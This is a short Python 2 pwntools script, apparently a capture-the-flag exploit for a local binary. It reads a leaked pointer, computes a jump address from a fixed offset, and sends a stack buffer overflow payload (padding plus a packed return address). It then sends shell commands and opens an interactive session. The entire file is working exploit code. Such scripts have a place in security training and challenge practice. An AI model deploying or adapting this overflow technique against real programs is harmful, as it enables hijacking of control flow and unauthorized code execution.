#!/usr/bin/python2
from pwn import *
import sys


p = process(sys.argv[1])


offset = 29
#offset = 61

p.recvuntil(':')
leakptr = int(p.recvline().strip(), 16)
shellptr = leakptr - offset
print("Leaked ptr " + hex(leakptr))
print("Which means i think the pointer i want to jump to is " + hex(shellptr))

p.sendline('A' * 64 + 'B' * 8 + p64(shellptr))
p.sendline('whoami ; galculator')
p.interactive()
